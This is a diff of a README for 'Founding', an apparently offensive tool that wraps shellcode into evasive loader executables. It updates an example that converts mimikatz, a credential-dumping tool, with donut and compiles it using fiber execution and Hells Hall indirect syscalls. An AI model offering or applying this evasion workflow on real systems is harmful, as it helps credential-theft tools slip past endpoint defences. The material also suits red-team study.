@@ -121,33 +121,35 @@ Founding is a tool that receives a Shellcode in ```.bin```, ```.exe``` or ```.dl
 ### Sintax
 
 ```bash
-Founding.exe <Generator type> <File.bin/exe/dll> <Enc/Obf Option> <Execution type> <Optional flags>
+Founding.exe <Generator type> <File.bin/.exe/.dll> <Enc/Obf Option> <Execution type> <Optional flags>
 ```
 
 ### Example Command
 ```bash
-donut.exe --input:mimikatz.exe --output:mimi.bin -b 1
+Founding.exe donut mimikatz.exe mac fibers --hells-hall
+[+] Running donut
+[+] Do you want to include parameters? (Y/N): n
 
-
-[ Donut shellcode generator v1 (built Mar  3 2023 13:33:22)
+  [ Donut shellcode generator v1 (built Oct 23 2024 07:55:06)
   [ Copyright (c) 2019-2021 TheWover, Odzhan
 
   [ Instance type : Embedded
-  [ Module file   : "mimikatz.exe"
+  [ Module file   : ".\mimikatz.exe"
   [ Entropy       : Random names + Encryption
   [ File type     : EXE
   [ Target CPU    : x86+amd64
-  [ AMSI/WDLP/ETW : continue
+  [ AMSI/WDLP/ETW : none
   [ PE Headers    : overwrite
-  [ Shellcode     : "mimi.bin"
+  [ Shellcode     : "output\code\Erwin.bin"
   [ Exit          : Thread
-```
-```bash
-Founding.exe mimi.bin aes APC --compile
 
-
-Compilation successful.
-Shinzo wo Sasageyo! Erwin.exe Created.
+[+] Erwin.bin created using donut.
+[+] Including EXEC (Fibers) functionality in compilation...
+[+] Including INDIRECT SYSCALLS (Initialize Indirect Syscalls) functionality in compilation...
+[+] Including INDIRECT SYSCALLS (Hells Hall Fibers) functionality in compilation...
+[+] Compiling with GCC...
+[+] Compilation successful.
+[+] Shinzo wo Sasageyo! Erwin.exe Created.
 ```
 
 ### Note
